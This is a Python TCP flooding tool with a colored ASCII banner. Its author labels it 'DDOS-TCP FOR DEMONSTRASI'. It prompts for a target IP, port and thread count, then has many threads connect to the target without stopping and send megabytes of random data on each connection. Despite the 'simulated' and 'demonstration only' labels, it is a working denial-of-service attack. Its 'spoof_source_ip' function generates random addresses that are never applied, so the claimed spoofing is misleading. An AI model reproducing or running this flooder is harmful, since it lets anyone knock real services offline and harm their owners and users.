#CODED BY ASIO
import socket
import random
import threading
import time
import os
from colorama import Fore as F
from colorama import Style

logo = f"""
{Style.BRIGHT}{F.BLUE}╭━━╮╭╮╱╱╭━━┳━━━━┳━━━━┳━━━┳╮╱╭┳━━━┳╮╱╱╭╮╭━━━━┳━━━┳━━━╮
{F.MAGENTA}┃╭╮┃┃┃╱╱╰┫┣┫╭╮╭╮┣━━╮━┃╭━━┫┃╱┃┃╭━╮┃╰╮╭╯┃┃╭╮╭╮┃╭━╮┃╭━╮┃
{F.RED}┃╰╯╰┫┃╱╱╱┃┃╰╯┃┃╰╯╱╭╯╭┫╰━━┫┃╱┃┃╰━╯┣╮╰╯╭╯╰╯┃┃╰┫┃╱╰┫╰━╯┃
{F.YELLOW}┃╭━╮┃┃╱╭╮┃┃╱╱┃┃╱╱╭╯╭╯┃╭━━┫┃╱┃┃╭╮╭╯╰╮╭╋━━╮┃┃╱┃┃╱╭┫╭━━╯
{F.GREEN}┃╰━╯┃╰━╯┣┫┣╮╱┃┃╱╭╯━╰━┫┃╱╱┃╰━╯┃┃┃╰╮╱┃┃╰━━╯┃┃╱┃╰━╯┃┃
{F.WHITE}╰━━━┻━━━┻━━╯╱╰╯╱╰━━━━┻╯╱╱╰━━━┻╯╰━╯╱╰╯╱╱╱╱╰╯╱╰━━━┻╯
{Style.DIM}{F.WHITE}CODED BY: ASIO
{Style.DIM}{F.WHITE}DDOS-TCP FOR DEMONSTRASI
"""

def get_data_range():
    while True:
        try:
            data_range = input(f"{F.MAGENTA}Enter data range (e.g., 1-5 for 1 MB to 5 MB): {F.WHITE}")
            start, end = map(int, data_range.split('-'))
            if start < 1 or end < start:
                raise ValueError
            return start, end
        except ValueError:
            print(f"{Style.BRIGHT}{F.RED}Invalid input. Please enter a valid range.")

def generate_random_data(start_mb, end_mb):
    size_in_bytes = random.randint(start_mb, end_mb) * 1024 * 1024
    data = os.urandom(size_in_bytes)
    return data

def generate_random_port():
    return random.randint(1024, 65535)

def spoof_source_ip():
    from scapy.all import sr, RandIP
    return str(RandIP())

class SimulatedAttack(object):
    def __init__(self, target_ip, target_port, data_range_start, data_range_end):
        self.target_ip = target_ip
        self.target_port = target_port
        self.data_range_start = data_range_start
        self.data_range_end = data_range_end
        self.attack_count = 0
        self.lock = threading.Lock()

    def simulate_attack(self):
        while True:
            source_ip = spoof_source_ip()
            source_port = generate_random_port()
            data = generate_random_data(self.data_range_start, self.data_range_end)

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)
                try:
                    sock.connect((self.target_ip, self.target_port))
                    sock.sendall(data)
                    print(f"{Style.BRIGHT}{F.GREEN}ATTACK {F.WHITE}TO {F.YELLOW}{self.target_ip}{F.WHITE}:{F.YELLOW}{self.target_port} {F.WHITE}- {F.MAGENTA}PORT {F.BLUE}{source_port} {F.RED}REQUESTS {F.MAGENTA}{self.attack_count} {F.GREEN}DATA {len(data) // 1024 // 1024} MB")
                except Exception as e:
                    pass

            with self.lock:
                self.attack_count += 1

def main():
    os.system("clear")
    print(logo)
    target_ip = input(f"{Style.BRIGHT}{F.MAGENTA}TARGET IP (FOR DEMONTRASI ONLY) >>> {F.WHITE}")
    target_port = int(input(f"{F.MAGENTA}TARGET PORT >>> {F.WHITE}"))
    threads = int(input(f"{F.MAGENTA}NUMBER OF THREADS >>>{F.WHITE} "))
    data_range_start, data_range_end = get_data_range()

    attack = SimulatedAttack(target_ip, target_port, data_range_start, data_range_end)

    for _ in range(threads):
        thread = threading.Thread(target=attack.simulate_attack)
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
